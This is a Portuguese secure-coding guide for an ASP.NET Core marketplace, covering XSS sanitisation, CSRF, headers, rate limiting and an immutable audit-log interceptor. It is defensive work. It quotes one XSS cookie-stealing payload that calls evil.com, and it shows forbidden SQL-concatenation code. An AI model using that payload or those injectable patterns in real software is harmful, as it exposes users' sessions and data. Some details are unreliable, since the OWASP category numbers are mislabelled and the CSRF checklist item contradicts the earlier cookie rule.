# Secure Coding Practices — Programação Segura e Resiliência

> **Stack:** ASP.NET Core 10 / EF Core 10 (parametrizado) / Ganss.XSS / Rate Limiting nativo / Serilog + Audit Interceptor
> **Versão:** 1.0 — 2026-09-09

---

## 1. Prevenção contra Vulnerabilidades Core — OWASP Top 10 (2021/2025)

### 1.1. A01 — Broken Access Control

- **Mitigação:** RBAC + Resource-Based Authorization (ver `auth_roles.md` §4). Todo endpoint de escrita exige `VendorOwnerOrAdmin` ou `AdminOnly`.
- **Regra:** Nunca confiar em `userId` vindo do body/query — sempre extrair de `ICurrentUser` (JWT `sub`).
- **Teste obrigatório:** `VendedorA_NaoPode_AprovarPedidoDaLojaB` deve retornar `403`.

### 1.2. A02 — Cryptographic Failures

- Senhas com BCrypt workFactor 12 (ver `auth_roles.md` §2.2).
- Dados sensíveis com DataProtection + `HasConversion` (ver `security_lgpd.md`).
- JWT com `HmacSha256`, `ValidateLifetime=true`, `ClockSkew=2min`, `RequireHttpsMetadata=true` em produção.
- `appsettings.json` nunca contém segredo em repo — usar User Secrets / KeyVault.

### 1.3. A03 — Injection (SQL Injection)

#### 1.3.1. EF Core parametrizado por padrão — por que é seguro

Todo LINQ é traduzido para SQL parametrizado pelo Npgsql:

```csharp
// Seguro — gera: SELECT ... WHERE "Email" = @__email_0
var usuario = await _db.Usuarios.FirstOrDefaultAsync(u => u.Email == email, ct);
```

**Proibições (devem falhar em code review):**

```csharp
// ❌ PROIBIDO — concatenação crua
var sql = $"SELECT * FROM \"Usuarios\" WHERE \"Email\" = '{email}'";
await _db.Database.ExecuteSqlRawAsync(sql);

// ❌ PROIBIDO — FromSqlRaw sem parâmetro
await _db.Usuarios.FromSqlRaw($"SELECT * FROM \"Usuarios\" WHERE \"Nome\" = '{nome}'").ToListAsync();

// ✅ PERMITIDO — FromSqlInterpolated (parametriza automaticamente) ou FromSqlRaw com placeholder
await _db.Usuarios.FromSqlInterpolated($"SELECT * FROM \"Usuarios\" WHERE \"Email\" = {email}").ToListAsync();
await _db.Usuarios.FromSqlRaw("SELECT * FROM \"Usuarios\" WHERE \"Email\" = {0}", email).ToListAsync();
```

**Regra de lint:** Adicionar `Roslyn Analyzer` que proíbe `ExecuteSqlRaw` sem parâmetros. Alternativa: usar `EFCore.BulkExtensions` apenas com queries parametrizadas.

#### 1.3.2. Validação de entrada — FluentValidation como primeira barreira

Ver `architecture.md` §4.3 — todo Command/Query passa por `ValidationBehavior` antes do Handler. Campos com tamanho máximo, regex e listas permitidas bloqueiam payloads maliciosos antes de tocar o banco.

### 1.4. A07 — Cross-Site Scripting (XSS)

#### 1.4.1. Vetor no projeto

Campos de texto do portfólio: `Produto.Nome`, `Produto.Descricao`, `Loja.Descricao`, `Usuario.NomeCompleto`. Se um vendedor inserir `<script>fetch('https://evil.com?cookie='+document.cookie)</script>` na descrição, e o frontend renderizar com `innerHTML`/`dangerouslySetInnerHTML`, há roubo de sessão.

#### 1.4.2. Estratégia de defesa — dupla camada

**Camada 1 — Sanitização na escrita (Infrastructure):**

```csharp
// src/Infrastructure/Security/Sanitization/HtmlSanitizerService.cs — linha 1
namespace GastronomiaMarketplace.Infrastructure.Security.Sanitization;

using Ganss.XSS;

public interface IHtmlSanitizerService
{
    string Sanitize(string? html);
}

public sealed class HtmlSanitizerService : IHtmlSanitizerService
{
    private readonly HtmlSanitizer _sanitizer;

    public HtmlSanitizerService()
    {
        _sanitizer = new HtmlSanitizer();
        // Permitir apenas tags seguras para descrição rica (se quiser rich text)
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.Add("b");
        _sanitizer.AllowedTags.Add("i");
        _sanitizer.AllowedTags.Add("u");
        _sanitizer.AllowedTags.Add("p");
        _sanitizer.AllowedTags.Add("br");
        _sanitizer.AllowedTags.Add("ul");
        _sanitizer.AllowedTags.Add("ol");
        _sanitizer.AllowedTags.Add("li");
        _sanitizer.AllowedTags.Add("strong");
        _sanitizer.AllowedTags.Add("em");
        // Atributos: nenhum (remove on*, href javascript:, style)
        _sanitizer.AllowedAttributes.Clear();
        // Se precisar de links: permitir <a href> apenas com http/https
        // _sanitizer.AllowedTags.Add("a");
        // _sanitizer.AllowedAttributes.Add("href");
        // _sanitizer.AllowedSchemes.Add("http");
        // _sanitizer.AllowedSchemes.Add("https");
    }

    public string Sanitize(string? html)
    {
        if (string.IsNullOrWhiteSpace(html)) return string.Empty;
        return _sanitizer.Sanitize(html);
    }
}
```

**Uso no Handler (Application):**

```csharp
// src/Application/Produtos/Commands/CriarProduto/CriarProdutoCommandHandler.cs — linha 1 (fragmento)
public async Task<Result<Guid>> Handle(CriarProdutoCommand req, CancellationToken ct)
{
    var nomeSanitizado = _sanitizer.Sanitize(req.Nome);
    var descricaoSanitizada = _sanitizer.Sanitize(req.Descricao);

    // Valida após sanitização — se sanitização removeu tudo, é ataque ou input vazio
    if (string.IsNullOrWhiteSpace(nomeSanitizado))
        return Result<Guid>.Failure("Nome contém conteúdo não permitido.");

    var produto = new Produto(
        lojaId: req.LojaId,
        nome: nomeSanitizado, // persiste sanitizado
        descricao: descricaoSanitizada,
        preco: req.Preco,
        quantidadeEmEstoque: req.QuantidadeEmEstoque
    );
    // ...
}
```

**Camada 2 — Headers + frontend:**

- API retorna `Content-Type: application/json` — browser não executa HTML dentro de JSON.
- Frontend **nunca** usa `dangerouslySetInnerHTML` sem sanitizar com `DOMPurify` no client também.
- CSP (ver §1.6).

#### 1.4.3. Validação de tamanho e caracteres

```csharp
// Validator — bloqueia payloads absurdos antes da sanitização
RuleFor(x => x.Descricao)
    .MaximumLength(4000).WithMessage("Descrição excede 4000 caracteres.")
    .Must(d => !d.Contains("<script", StringComparison.OrdinalIgnoreCase)).WithMessage("Conteúdo não permitido.");
    // Nota: esta regra é complementar — a sanitização é a defesa real
```

### 1.5. A08 — Cross-Site Request Forgery (CSRF) — Cookies HttpOnly Obrigatórios

#### 1.5.1. Contexto e decisão normativa

Este projeto usa **JWT em HttpOnly cookies** (`__Host-access_token` + `__Host-refresh_token`) com `SameSite=Strict`, `Secure` em produção e `withCredentials:true` no frontend. `localStorage` é **proibido** para tokens (mitiga XSS que rouba token via `localStorage.getItem`). Como cookies são enviados automaticamente, **CSRF passa a ser obrigatório** e é mitigado com `Antiforgery` + `SameSite=Strict` + `CORS AllowCredentials`.

#### 1.5.2. Configuração normativa com HttpOnly cookies

```csharp
// src/WebAPI/Program.cs — linha 1 (fragmento — apenas se usar cookies)
builder.Services.AddAntiforgery(opts =>
{
    opts.HeaderName = "X-CSRF-TOKEN";
    opts.Cookie.Name = "__Host-XSRF-TOKEN";
    opts.Cookie.HttpOnly = false; // JS precisa ler para enviar no header
    opts.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    opts.Cookie.SameSite = SameSiteMode.Strict;
});

// No pipeline
app.UseAntiforgery();

// Controller que emite token
[HttpGet("api/antiforgery/token")]
public IActionResult ObterTokenCsrf([FromServices] IAntiforgery antiforgery)
{
    var tokens = antiforgery.GetAndStoreTokens(HttpContext);
    return Ok(new { token = tokens.RequestToken });
}

// Endpoint sensível — exige token
[HttpPost("api/pedidos")]
[ValidateAntiForgeryToken] // ou [AutoValidateAntiforgeryToken] global
public async Task<IActionResult> Criar([FromBody] CriarPedidoDto dto) { ... }
```

**Frontend:** Lê cookie `XSRF-TOKEN` (não HttpOnly) e envia no header `X-CSRF-TOKEN` em `POST/PUT/PATCH/DELETE` via interceptor Axios. Em `localhost`, `Secure=false` (Development) para permitir `http`.

**Proibição normativa:** Nenhum token em `localStorage`/`sessionStorage`. `apiClient` usa `withCredentials:true` e nunca seta `Authorization` manualmente. Tokens apenas em cookies `HttpOnly`.

### 1.6. Headers de Segurança (OWASP Secure Headers)

```csharp
// src/WebAPI/Middlewares/SecurityHeadersMiddleware.cs — linha 1
namespace GastronomiaMarketplace.WebAPI.Middlewares;

public sealed class SecurityHeadersMiddleware
{
    private readonly RequestDelegate _next;
    public SecurityHeadersMiddleware(RequestDelegate next) => _next = next;

    public async Task InvokeAsync(HttpContext ctx)
    {
        ctx.Response.Headers["X-Content-Type-Options"] = "nosniff";
        ctx.Response.Headers["X-Frame-Options"] = "DENY";
        ctx.Response.Headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
        ctx.Response.Headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()";
        ctx.Response.Headers["X-XSS-Protection"] = "0"; // desativa XSS filter legado — CSP é melhor
        // CSP — ajuste conforme frontend
        ctx.Response.Headers["Content-Security-Policy"] =
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.seudominio.com";
        // HSTS — apenas em produção com HTTPS
        if (!ctx.RequestServices.GetRequiredService<IWebHostEnvironment>().IsDevelopment())
            ctx.Response.Headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains; preload";

        await _next(ctx);
    }
}

// Registro — antes de UseAuthentication
app.UseMiddleware<SecurityHeadersMiddleware>();
```

---

## 2. Rate Limiting — Middleware Nativo do ASP.NET Core 10

### 2.1. Por que Rate Limiting?

- Mitigar **força bruta** em `POST /api/auth/login` e `POST /api/auth/registro`.
- Mitigar **abuso** no `POST /api/pedidos/simular-pagamento-pix` (endpoint que simula PIX fictício — sem limitação, atacante gera carga e polui comissões).
- Mitigar **scraping** em `GET /api/lojas/proximas`.

### 2.2. Configuração — `RateLimitingExtensions.cs`

```csharp
// src/WebAPI/Extensions/RateLimitingExtensions.cs — linha 1
namespace GastronomiaMarketplace.WebAPI.Extensions;

using System.Threading.RateLimiting;
using Microsoft.AspNetCore.RateLimiting;

public static class RateLimitingExtensions
{
    public static IServiceCollection AddRateLimitingPolicies(this IServiceCollection services)
    {
        services.AddRateLimiter(opts =>
        {
            opts.RejectionStatusCode = StatusCodes.Status429TooManyRequests;

            // Política global — 100 req/min por IP (default para todos os endpoints)
            opts.AddPolicy("default", ctx =>
                RateLimitPartition.GetFixedWindowLimiter(
                    partitionKey: ctx.Connection.RemoteIpAddress?.ToString() ?? "unknown",
                    factory: _ => new FixedWindowRateLimiterOptions
                    {
                        PermitLimit = 100,
                        Window = TimeSpan.FromMinutes(1),
                        QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
                        QueueLimit = 0
                    }));

            // Login — 5 tentativas por minuto por IP (mitiga brute force)
            opts.AddPolicy("login", ctx =>
                RateLimitPartition.GetFixedWindowLimiter(
                    partitionKey: ctx.Connection.RemoteIpAddress?.ToString() ?? "unknown",
                    factory: _ => new FixedWindowRateLimiterOptions
                    {
                        PermitLimit = 5,
                        Window = TimeSpan.FromMinutes(1),
                        QueueLimit = 0
                    }));

            // Registro de conta — 3 por hora por IP (mitiga criação em massa)
            opts.AddPolicy("registro", ctx =>
                RateLimitPartition.GetFixedWindowLimiter(
                    partitionKey: ctx.Connection.RemoteIpAddress?.ToString() ?? "unknown",
                    factory: _ => new FixedWindowRateLimiterOptions
                    {
                        PermitLimit = 3,
                        Window = TimeSpan.FromHours(1),
                        QueueLimit = 0
                    }));

            // Simulação PIX — 10 por minuto por usuário autenticado (ou IP se anônimo)
            opts.AddPolicy("pix", ctx =>
            {
                var userId = ctx.User.FindFirst("sub")?.Value ?? ctx.Connection.RemoteIpAddress?.ToString() ?? "anon";
                return RateLimitPartition.GetFixedWindowLimiter(
                    partitionKey: userId,
                    factory: _ => new FixedWindowRateLimiterOptions
                    {
                        PermitLimit = 10,
                        Window = TimeSpan.FromMinutes(1),
                        QueueLimit = 0
                    });
            });

            // OnFailure — resposta padronizada
            opts.OnRejected = async (context, ct) =>
            {
                context.HttpContext.Response.StatusCode = StatusCodes.Status429TooManyRequests;
                context.HttpContext.Response.Headers.RetryAfter = "60";
                await context.HttpContext.Response.WriteAsJsonAsync(new
                {
                    error = "Muitas requisições. Tente novamente em breve.",
                    retryAfterSeconds = 60
                }, ct);
            };
        });

        return services;
    }
}
```

### 2.3. Aplicação nos Controllers

```csharp
// src/WebAPI/Controllers/AuthController.cs — linha 1 (fragmento)
[HttpPost("login")]
[EnableRateLimiting("login")]
[AllowAnonymous]
public async Task<IActionResult> Login([FromBody] LoginDto dto, CancellationToken ct) { ... }

[HttpPost("registro")]
[EnableRateLimiting("registro")]
[AllowAnonymous]
public async Task<IActionResult> Registrar([FromBody] RegistrarDto dto, CancellationToken ct) { ... }

// src/WebAPI/Controllers/PedidosController.cs — linha 1 (fragmento)
[HttpPost("simular-pagamento-pix")]
[Authorize]
[EnableRateLimiting("pix")]
public async Task<IActionResult> SimularPix([FromBody] SimularPixDto dto, CancellationToken ct) { ... }

// Global fallback — todos os outros endpoints usam "default"
app.MapControllers().RequireRateLimiting("default");
```

### 2.4. Testes de Rate Limiting

```csharp
// tests/WebAPI.IntegrationTests/RateLimitingTests.cs — linha 1 (fragmento)
[Fact]
public async Task Login_DeveRetornar429_Apos5TentativasNoMesmoMinuto()
{
    var client = _factory.CreateClient();
    for (int i = 0; i < 5; i++)
        await client.PostAsJsonAsync("/api/auth/login", new { email = "x@x.com", senha = "errada" });

    var sixth = await client.PostAsJsonAsync("/api/auth/login", new { email = "x@x.com", senha = "errada" });
    Assert.Equal(HttpStatusCode.TooManyRequests, sixth.StatusCode);
    Assert.True(sixth.Headers.Contains("Retry-After"));
}
```

---

## 3. Logs e Trilha de Auditoria Imutável — `AuditLogs`

### 3.1. Requisitos

- **Quem** alterou (`usuario_id` do JWT).
- **O que** foi alterado (`entidade`, `entidade_id`).
- **Quando** (`timestamp` UTC).
- **Delta** (`valores_antigos` vs `valores_novos` em JSON).
- **Ação** (`INSERT`, `UPDATE`, `DELETE`, `APROVAR_PEDIDO`, `ALTERAR_PRECO`, `CANCELAR_PEDIDO`, etc.).
- **Imutável:** Nenhum `UPDATE`/`DELETE` em `AuditLogs` após inserção.

### 3.2. Esquema da Tabela `AuditLogs`

```sql
-- Migrations/20260909_Initial.cs (fragmento)
CREATE TABLE "AuditLogs" (
    "Id" uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    "UsuarioId" uuid NULL REFERENCES "Usuarios"("Id") ON DELETE SET NULL, -- quem fez
    "Acao" varchar(100) NOT NULL, -- ex: "UPDATE", "APROVAR_PEDIDO", "ANONIMIZACAO_LGPD"
    "Entidade" varchar(100) NOT NULL, -- ex: "Produto", "Pedido", "Usuario"
    "EntidadeId" varchar(100) NOT NULL, -- Id da entidade afetada (string para suportar uuid/int)
    "DataUtc" timestamptz NOT NULL DEFAULT now(),
    "ValoresAntigos" jsonb NULL, -- snapshot antes
    "ValoresNovos" jsonb NULL, -- snapshot depois
    "IpOrigem" varchar(45) NULL,
    "UserAgent" varchar(500) NULL,
    "Detalhes" text NULL -- mensagem humana opcional
);

CREATE INDEX "IX_AuditLogs_Entidade_EntidadeId" ON "AuditLogs" ("Entidade", "EntidadeId");
CREATE INDEX "IX_AuditLogs_UsuarioId_DataUtc" ON "AuditLogs" ("UsuarioId", "DataUtc" DESC);
CREATE INDEX "IX_AuditLogs_DataUtc" ON "AuditLogs" ("DataUtc" DESC);

-- Imutabilidade: revoga UPDATE/DELETE para o role da aplicação
-- (opcional, mas recomendado)
-- REVOKE UPDATE, DELETE ON "AuditLogs" FROM gastronomia_app;
-- Ou via trigger que impede UPDATE/DELETE:
CREATE OR REPLACE FUNCTION fn_prevent_audit_mutation() RETURNS trigger AS $$
BEGIN
    RAISE EXCEPTION 'AuditLogs é imutável — UPDATE/DELETE não permitido';
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trg_audit_immutable
BEFORE UPDATE OR DELETE ON "AuditLogs"
FOR EACH ROW EXECUTE FUNCTION fn_prevent_audit_mutation();
```

**Entidade `AuditLog`:**

```csharp
// src/Domain/Entities/AuditLog.cs — linha 1
namespace GastronomiaMarketplace.Domain.Entities;

using GastronomiaMarketplace.Domain.Common;

public sealed class AuditLog : BaseEntity
{
    public Guid? UsuarioId { get; private set; }
    public string Acao { get; private set; } = null!;
    public string Entidade { get; private set; } = null!;
    public string EntidadeId { get; private set; } = null!;
    public DateTime DataUtc { get; private set; }
    public string? ValoresAntigosJson { get; private set; } // jsonb
    public string? ValoresNovosJson { get; private set; }
    public string? IpOrigem { get; private set; }
    public string? UserAgent { get; private set; }
    public string? Detalhes { get; private set; }

    private AuditLog() { }

    public AuditLog(Guid? usuarioId, string acao, string entidade, string entidadeId,
        string? valoresAntigosJson = null, string? valoresNovosJson = null,
        string? ipOrigem = null, string? userAgent = null, string? detalhes = null)
    {
        UsuarioId = usuarioId;
        Acao = acao;
        Entidade = entidade;
        EntidadeId = entidadeId;
        DataUtc = DateTime.UtcNow;
        ValoresAntigosJson = valoresAntigosJson;
        ValoresNovosJson = valoresNovosJson;
        IpOrigem = ipOrigem;
        UserAgent = userAgent;
        Detalhes = detalhes;
    }
}
```

### 3.3. Interceptação Automática — Sobrescrevendo `SaveChangesAsync`

**Abordagem A — Interceptor `SaveChangesInterceptor` (recomendado EF Core 10):**

```csharp
// src/Infrastructure/Persistence/Interceptors/AuditableEntityInterceptor.cs — linha 1
namespace GastronomiaMarketplace.Infrastructure.Persistence.Interceptors;

using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.ChangeTracking;
using Microsoft.EntityFrameworkCore.Diagnostics;
using GastronomiaMarketplace.Application.Common.Interfaces;
using GastronomiaMarketplace.Domain.Entities;

public sealed class AuditableEntityInterceptor : SaveChangesInterceptor
{
    private readonly ICurrentUser _currentUser;
    private readonly IHttpContextAccessor _http;

    public AuditableEntityInterceptor(ICurrentUser currentUser, IHttpContextAccessor http)
    {
        _currentUser = currentUser;
        _http = http;
    }

    public override async ValueTask<InterceptionResult<int>> SavingChangesAsync(
        DbContextEventData eventData, InterceptionResult<int> result, CancellationToken ct = default)
    {
        var ctx = eventData.Context;
        if (ctx is null) return await base.SavingChangesAsync(eventData, result, ct);

        var auditEntries = new List<AuditLog>();
        var ip = _http.HttpContext?.Connection.RemoteIpAddress?.ToString();
        var ua = _http.HttpContext?.Request.Headers.UserAgent.ToString();
        var usuarioId = _currentUser.UserId;

        foreach (var entry in ctx.ChangeTracker.Entries<BaseEntity>())
        {
            if (entry.Entity is AuditLog) continue; // evita loop infinito

            // Atualiza timestamps
            if (entry.State == EntityState.Added)
                entry.Entity.GetType().GetProperty("CriadoEmUtc")?.SetValue(entry.Entity, DateTime.UtcNow);
            if (entry.State == EntityState.Modified)
                entry.Entity.GetType().GetProperty("AtualizadoEmUtc")?.SetValue(entry.Entity, DateTime.UtcNow);

            // Gera AuditLog apenas para entidades relevantes
            if (entry.State is EntityState.Added or EntityState.Modified or EntityState.Deleted)
            {
                var entidade = entry.Entity.GetType().Name;
                var entidadeId = entry.Properties.FirstOrDefault(p => p.Metadata.Name == "Id")?.CurrentValue?.ToString() ?? "?";
                var acao = entry.State.ToString().ToUpperInvariant(); // INSERT/UPDATE/DELETE

                string? antigos = null, novos = null;

                if (entry.State == EntityState.Modified)
                {
                    var oldValues = new Dictionary<string, object?>();
                    var newValues = new Dictionary<string, object?>();
                    foreach (var prop in entry.Properties)
                    {
                        var original = prop.OriginalValue;
                        var current = prop.CurrentValue;
                        if (!Equals(original, current))
                        {
                            oldValues[prop.Metadata.Name] = original;
                            newValues[prop.Metadata.Name] = current;
                        }
                    }
                    if (oldValues.Count > 0)
                    {
                        antigos = JsonSerializer.Serialize(oldValues);
                        novos = JsonSerializer.Serialize(newValues);
                    }
                    else
                    {
                        continue; // sem mudança real — não audita
                    }
                }
                else if (entry.State == EntityState.Added)
                {
                    var newValues = entry.Properties.ToDictionary(p => p.Metadata.Name, p => p.CurrentValue);
                    novos = JsonSerializer.Serialize(newValues);
                }
                else if (entry.State == EntityState.Deleted)
                {
                    var oldValues = entry.Properties.ToDictionary(p => p.Metadata.Name, p => p.OriginalValue);
                    antigos = JsonSerializer.Serialize(oldValues);
                }

                auditEntries.Add(new AuditLog(
                    usuarioId: usuarioId,
                    acao: acao,
                    entidade: entidade,
                    entidadeId: entidadeId,
                    valoresAntigosJson: antigos,
                    valoresNovosJson: novos,
                    ipOrigem: ip,
                    userAgent: ua
                ));
            }
        }

        if (auditEntries.Count > 0)
            ctx.Set<AuditLog>().AddRange(auditEntries);

        return await base.SavingChangesAsync(eventData, result, ct);
    }
}
```

**Abordagem B — Override direto no `AppDbContext` (alternativa se não usar interceptor):**

```csharp
// src/Infrastructure/Persistence/AppDbContext.cs — linha 1 (fragmento)
public override async Task<int> SaveChangesAsync(CancellationToken ct = default)
{
    // ... mesma lógica de AuditableEntityInterceptor, mas inline ...
    return await base.SaveChangesAsync(ct);
}
```

**Registro do interceptor:**

```csharp
// src/Infrastructure/DependencyInjection.cs — linha 1 (fragmento)
services.AddScoped<AuditableEntityInterceptor>();
services.AddDbContext<AppDbContext>((sp, opts) =>
{
    opts.UseNpgsql(connStr, o => o.UseNetTopologySuite());
    opts.AddInterceptors(sp.GetRequiredService<AuditableEntityInterceptor>());
});
```

### 3.4. Exemplos de `AuditLogs` gerados

| DataUtc | UsuarioId | Acao | Entidade | EntidadeId | ValoresAntigos | ValoresNovos |
|---|---|---|---|---|---|---|
| 2026-09-09 14:00Z | `a3f1...` | UPDATE | Produto | `p1` | `{"Preco": 59.90, "QuantidadeEmEstoque": 10}` | `{"Preco": 64.90, "QuantidadeEmEstoque": 10}` |
| 2026-09-09 14:05Z | `b2c3...` | UPDATE | Pedido | `ped1` | `{"Status": 1}` | `{"Status": 2}` |
| 2026-09-09 14:10Z | `f1a2...` | ANONIMIZACAO_LGPD | Usuario | `a3f1...` | `null` | `null` (detalhes: "hash=ab12cd34") |
| 2026-09-09 14:12Z | `a3f1...` | INSERT | Pedido | `ped2` | `null` | `{"ClienteId": "...", "ValorBruto": 89.90}` |

### 3.5. Consulta — Apenas Admin

```csharp
// src/Application/Admin/Queries/ListarAuditLogs/ListarAuditLogsQuery.cs — linha 1
public sealed record ListarAuditLogsQuery(
    string? Entidade, string? EntidadeId, Guid? UsuarioId,
    DateTime? De, DateTime? Ate, int Pagina = 1, int Tamanho = 20
) : IRequest<PaginatedList<AuditLogDto>>;

// Controller
[HttpGet("api/admin/audit-logs")]
[Authorize(Policy = "AdminOnly")]
public async Task<IActionResult> Listar([FromQuery] ListarAuditLogsQuery query, CancellationToken ct)
{
    var result = await _mediator.Send(query, ct);
    return Ok(result);
}
```

### 3.6. Serilog — Logs Estruturados (complemento ao AuditLog)

`AuditLogs` é trilha **de negócio** no banco. **Serilog** é log **técnico** (request, exception, performance):

```csharp
// src/WebAPI/Program.cs — linha 1 (fragmento)
builder.Host.UseSerilog((ctx, lc) => lc
    .ReadFrom.Configuration(ctx.Configuration)
    .Enrich.FromLogContext()
    .Enrich.WithProperty("Application", "GastronomiaMarketplace")
    .WriteTo.Console(outputTemplate: "[{Timestamp:HH:mm:ss} {Level:u3}] {Message:lj} {Properties:j}{NewLine}{Exception}")
    .WriteTo.PostgreSQL(
        connectionString: builder.Configuration.GetConnectionString("Default"),
        tableName: "SerilogLogs",
        needAutoCreateTable: true
    ));
```

**Nunca logar:** `senha`, `alergias` em plaintext, `Authorization` header, `cpf` completo.

---

## 4. Outros Controles de Resiliência

### 4.1. Validação de Tamanho de Payload

```csharp
// src/WebAPI/Program.cs — linha 1 (fragmento)
builder.Services.Configure<IISServerOptions>(o => o.MaxRequestBodySize = 1 * 1024 * 1024); // 1MB
builder.Services.Configure<KestrelServerOptions>(o => o.Limits.MaxRequestBodySize = 1 * 1024 * 1024);
```

### 4.2. Timeouts e Retries (para geocoding externo)

```csharp
// src/Infrastructure/Geolocation/PostgisGeocodingService.cs — linha 1 (fragmento)
services.AddHttpClient<IGeocodingService, PostgisGeocodingService>(c =>
{
    c.Timeout = TimeSpan.FromSeconds(5);
})
.AddPolicyHandler(Polly.Policy.TimeoutAsync<HttpResponseMessage>(TimeSpan.FromSeconds(3)))
.AddTransientHttpErrorPolicy(p => p.WaitAndRetryAsync(3, _ => TimeSpan.FromMilliseconds(200)));
```

### 4.3. Health Checks

```csharp
builder.Services.AddHealthChecks()
    .AddNpgSql(builder.Configuration.GetConnectionString("Default")!, name: "postgres")
    .AddCheck<MemoryHealthCheck>("memory");
```

---

## 5. Checklist para o Agente

- [ ] Parametrizar todas as queries — proibir `FromSqlRaw` com interpolação crua; usar `FromSqlInterpolated` quando necessário.
- [ ] Implementar `HtmlSanitizerService` com `Ganss.XSS` e sanitizar `Nome`/`Descricao` de Produto/Loja na escrita.
- [ ] Configurar `SecurityHeadersMiddleware` com CSP, HSTS, X-Content-Type-Options.
- [ ] Configurar CSRF apenas se usar cookies; documentar que JWT Bearer já mitiga CSRF.
- [ ] Implementar `AddRateLimitingPolicies` com 4 políticas (`default`, `login`, `registro`, `pix`) e aplicar com `[EnableRateLimiting]`.
- [ ] Criar tabela `AuditLogs` com trigger de imutabilidade + `AuditableEntityInterceptor` que captura `ValoresAntigos`/`ValoresNovos` em `jsonb`.
- [ ] Registrar interceptor em `AddDbContext` e garantir que `AuditLog` não se auto-audita.
- [ ] Configurar Serilog sem logar dados sensíveis; mascarar `cpf`, `alergias`, `Authorization`.
- [ ] Escrever testes de integração para 403, 429 e XSS sanitizado.
